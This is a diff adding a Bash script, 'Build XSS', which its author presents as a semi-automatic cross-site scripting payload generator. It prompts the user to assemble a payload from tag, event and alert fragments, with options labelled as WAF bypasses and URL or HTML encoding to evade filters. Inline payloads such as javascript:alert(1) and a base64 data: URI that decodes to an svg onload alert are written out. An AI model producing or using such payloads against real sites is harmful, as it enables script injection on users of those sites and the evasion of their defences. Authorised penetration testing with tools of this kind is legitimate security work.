@@ -1,0 +1,210 @@
+#!/bin/bash
+
+#Welcome :) || @F4LCONE_ Follow Mee :)
+source Sources/ShortTags.sh
+source Sources/LongTags.sh
+source Sources/RandomTags.sh
+source Sources/colors.sh
+source Sources/ShortEvents.sh
+source Sources/LongEvents.sh
+source Sources/RandomEvents.sh
+source Sources/BasicAlert.sh
+source Sources/WithoutParentheses.sh
+source Sources/BypassWaF.sh
+
+
+
+xssPayload=" ";
+
+echo -e $cyan '#  ______       _ _     ___   __ _____ _____ '
+echo -e $cyan '#  | ___ \     (_) |   | \ \ / //  ___/  ___|'
+echo -e $cyan '#  | |_/ /_   _ _| | __| |\ V / \ `--.\ `--. '
+echo -e $cyan '#  | ___ \ | | | | |/ _` |/   \  `--. \`--. \'
+echo -e $cyan '#  | |_/ / |_| | | | (_| / /^\ \/\__/ /\__/ /'
+echo -e $cyan '#  \____/ \__,_|_|_|\__,_\/   \/\____/\____/ '
+echo -e $cyan '#                                            ' $finishColor
+
+
+echo -e $ozelkirmizi "Build XSS is a Semi-Automatic XSS Payload Generator." $finishColor
+echo -e $blue "#~> Author : Samet ŞAHİN"
+echo -e $blue "#~> Twitter : @F4LCONE_"
+echo -e $blue "#~> LinkedIn : sametsahinn "
+echo -e $blue "#~> Website : \e]8;;http://sametsahin.net\ahttp://sametsahin.net\e]8;;\a \n"$finishColor
+echo -e $white "Let's Create XSS Payload... \n" $finishColor
+
+
+echo -e $ozelkirmizi "Are you know XSS type ? \n 1-) Normal XSS \n 2-) HTML Inline XSS \n 3-) JavaScript Inline XSS \n If you are want to Create a Custom Payload Please Press 4." $finishColor
+read -p " Choice == " xssTipSec
+echo -e $darkgray "------------------------------" $finishColor
+case $xssTipSec in
+	1) echo -e $white " I  Choice Random 3 Payload : \n" $finishColor
+	cat TXTs/NormalXSS.txt | shuf -n 3
+	;;
+	2) echo -e $white " I  Choice Random 3 Payload : \n" $finishColor
+	cat TXTs/HtmlInlineXSS.txt | shuf -n 3
+	;;
+	3) echo -e $white " I  Choice Random 3 Payload : \n" $finishColor
+	cat TXTs/JsInlineXSS.txt | shuf -n 3
+	;;
+	*)
+echo -e $turuncu "\"> == 1 \n '> == 2 \n  > == 3 \n ( Default : 1 )" $finishColor
+read -p " Choice == " baslangicTagi #Kullanıcıdan bir numara aldım ve baslangicTagi'na atadım.
+case $baslangicTagi in 
+	1) xssPayload=" \"> "
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	2) xssPayload=" '> "
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	3) xssPayload=" > "
+    	echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	*) xssPayload=" \"> "
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+esac
+sleep 0.1
+echo -e $darkgray "------------------------------" $finishColor
+
+#------------------------------------------------------------------------ PART 2
+
+echo -e $turuncu "Short tags (a,svg,img...) == 1 \n Select long tags (iframe,embed,script...) == 2 \n Select undefined tags (for WaF) == 3 \n ( Default : 1 ) "$finishColor
+read -p " Choice == " devamTaglari
+case $devamTaglari in
+	1) xssPayload="$xssPayload $arrShort"
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	2) xssPayload="$xssPayload $arrLong"
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	3) xssPayload="$xssPayload $arrRandom"
+    	echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	*) xssPayload="$xssPayload $arrShort"
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+esac
+sleep 0.1
+echo -e $darkgray "------------------------------" $finishColor
+
+#------------------------------------------------------------------------ PART 3
+
+echo -e $turuncu ""\/" == 1 \n "\+" == 2 \n "\%\0\A" == 3 \n (Default : 1 ) "$finishColor
+read -p " Choice == " tagBirlestirenEvent
+case $tagBirlestirenEvent in
+	1) xssPayload="$xssPayload / "
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	2) xssPayload="$xssPayload + "
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	3) xssPayload="$xssPayload %0A "
+    	echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	*) xssPayload="$xssPayload / "
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+esac
+sleep 0.1
+echo -e $darkgray "------------------------------" $finishColor
+
+#------------------------------------------------------------------------ PART 4 -- ANSWER BASED!!!
+echo -e " Do you want Extra attribute (href,src...) ? (y,N)"
+read -p " Choice == " extraAttribute
+if [[ $extraAttribute =~ ^[Yy]$ ]];
+	then
+	echo -e $turuncu "src=\"javascript:alert(1)\" == 1 \n href=\"//data:text/html;base64,Ij48c3ZnL29ubG9hZD1hbGVydCgxKTs+\" == 2 \n "\x\y\x\=\"\y\x\y\"" == 3 \n (Default : 1 ) "$finishColor
+	read -p " Choice == " extraEvent
+	case $extraEvent in
+	1) xssPayload="$xssPayload src=\"javascript:alert(1)\" + "
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	2) xssPayload="$xssPayload href=\"\/\/data:text/html;base64,Ij48c3ZnL29ubG9hZD1hbGVydCgxKTs+\" + "
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	3) xssPayload="$xssPayload xyx=\"yxy\" + "
+    	echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+	*) xssPayload="$xssPayload src=\"javascript:alert(1)\" +  "
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " not ready :( Keep Going !" $finishColor
+		;;
+esac
+sleep 0.1
+echo -e $darkgray "------------------------------" $finishColor
+fi
+
+#------------------------------------------------------------------------ PART 5
+
+
+echo -e $turuncu "Short Events (oncut,onload,onerror...) == 1 \n Long Events (onmouseover,onresize,onunload...) == 2 \n Undefined Events == 3 \n (Default : 1 ) "$finishColor
+read -p " Choice == " extraEvent
+case $extraEvent in
+	1) xssPayload="$xssPayload $arrShortEvent"
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " almost ready :( Keep Going !" $finishColor
+		;;
+	2) xssPayload="$xssPayload $arrLongEvent"
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " almost ready :( Keep Going !" $finishColor
+		;;
+	3) xssPayload="$xssPayload $arrUndefinedEvent"
+    	echo -e $ozelmavi "XSS payload #:: " $xssPayload " almost ready :( Keep Going !" $finishColor
+		;;
+	*) xssPayload="$xssPayload $arrShortEvent"
+		echo -e $ozelmavi "XSS payload #:: " $xssPayload " almost ready :( Keep Going !" $finishColor
+		;;
+esac
+sleep 0.1
+echo -e $darkgray "------------------------------" $finishColor
+
+#------------------------------------------------------------------------ PART 6
+
+echo -e $turuncu "Basic Alert (alert(1),prompt(1),confirm(1)...) == 1 \n Without Parentheses (alert\`1\`,prompt\`1\`,confirm\`1\`...) == 2 \n Bypass WaF == 3 \n (Default : 1 ) "$finishColor
+read -p " Choice == " extraEvent
+case $extraEvent in
+	1) xssPayload="$xssPayload $arrBasicAlert>"
+		;;
+	2) xssPayload="$xssPayload $arrWithoutParentheses //"
+		;;
+	3) xssPayload="$xssPayload $arrBypassWaF //"
+		;;
+	*) xssPayload="$xssPayload $arrBasicAlert >"
+		;;
+esac
+echo -e $darkgray "------------------------------" $finishColor
+noSpaceXSSPayload=$(echo $xssPayload | tr -d ' ')
+
+echo -e $ozelkirmizi "Do you want URL Encode for WaF ? (Y,n)" $finishColor
+read -p " Choice == " urlEncodeIstiyoMu 
+echo -e ""
+echo -e $darkgray "------------------------------" $finishColor
+if [[ $urlEncodeIstiyoMu =~ ^[Yy]$ ]]; 
+then
+	urlEncodeFormat=$(echo -n "$noSpaceXSSPayload" | \
+	perl -pe's/([^-_.~A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg'); #URL Encode with PERL, I <3 PERL 
+	
+	echo -e $white "Url Encoded XSS Payload (For WaF) \n" $yesiltonu $urlEncodeFormat $finishColor
+	echo -e $darkgray "------------------------------" $finishColor
+fi
+
+#--------------------  #HTML Encode with PERL, I <3 PERL
+
+echo -e $ozelkirmizi "Do you want HTML Encode for WaF ? (y,N)" $finishColor
+read -p " Choice == " htmlEncodeIstiyoMu
+echo -e ""
+if [[ $htmlEncodeIstiyoMu =~ ^[Yy]$ ]];
+then
+	htmlEncodeFormat=$(echo "$noSpaceXSSPayload" |perl -n -mHTML::Entities -e ' ; print HTML::Entities::encode_entities($_) ;')
+	echo -e $white "HTML Encoded XSS Payload (For WaF) \n" $yesiltonu $htmlEncodeFormat $finishColor "\n"
+	
+fi
+echo -e $darkgray "------------------------------" $finishColor
+#-------------------- No Encode :(
+
+echo -e $white "XSS Payload is Generated: \n" $yesiltonu $noSpaceXSSPayload $finishColor 
+esac
+sleep 0.1
+echo -e $darkgray "------------------------------" $finishColor
+
+#------------------------------------------------------------------------ FINISH
+
+sleep 1
+exit
